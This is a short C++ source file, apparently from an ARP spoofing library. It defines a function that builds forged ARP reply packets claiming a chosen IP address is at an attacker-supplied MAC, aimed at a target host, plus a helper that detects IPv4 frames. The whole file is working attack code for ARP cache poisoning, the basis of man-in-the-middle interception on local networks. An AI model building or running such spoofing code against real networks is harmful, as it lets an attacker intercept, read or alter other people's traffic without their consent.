#include "arp_spoofer_lib/headers/net_structure.h"

arp_packet *arp_packet_constructor(u_char *cheating_ip, u_char *mac_of_cheating_ip,
                                   u_char *receiver_ip, u_char *receiver_mac) {
    arp_packet *p_new_arp_packet = new arp_packet;

    // Fill up ethernet header
    std::copy(mac_of_cheating_ip, mac_of_cheating_ip + 6, p_new_arp_packet->eth_hdr.src_mac);
    std::copy(receiver_mac, receiver_mac + 6, p_new_arp_packet->eth_hdr.dst_mac);
    p_new_arp_packet->eth_hdr.type = htons(0x0806);     // Type is ARP

    p_new_arp_packet->arp_hdr.hardware_type = htons(0x0001);            // 0x0001 -> Ethernet
    p_new_arp_packet->arp_hdr.proto_type = htons(0x0800);               // 0x0800 -> IPv4
    p_new_arp_packet->arp_hdr.hardware_size = 0x06;                     // 0x06 -> size of MAC
    p_new_arp_packet->arp_hdr.proto_size = 0x04;                        // 0x04 -> size of IP
    p_new_arp_packet->arp_hdr.op_code = htons(0x0002);               // 0x0002 -> ARP reply

    // 'cheating_ip' is at 'mac_of_cheating_ip'
    std::copy(mac_of_cheating_ip, mac_of_cheating_ip + 6, p_new_arp_packet->arp_hdr.src_mac);
    std::copy(cheating_ip, cheating_ip + 4, p_new_arp_packet->arp_hdr.src_ip);

    std::copy(receiver_mac, receiver_mac + 6, p_new_arp_packet->arp_hdr.dst_mac);
    std::copy(receiver_ip, receiver_ip + 4, p_new_arp_packet->arp_hdr.dst_ip);

    std::fill(p_new_arp_packet->padding,
              p_new_arp_packet->padding + sizeof(p_new_arp_packet->padding),
              0);
    return p_new_arp_packet;
}

bool is_ethernet_frame_carrying_ipv4(u_char *pkt_data) {
    constexpr int EH_TYPE_IPV4 = 0x0008;
    return ((ethernet_header *) pkt_data)->type == EH_TYPE_IPV4;
}
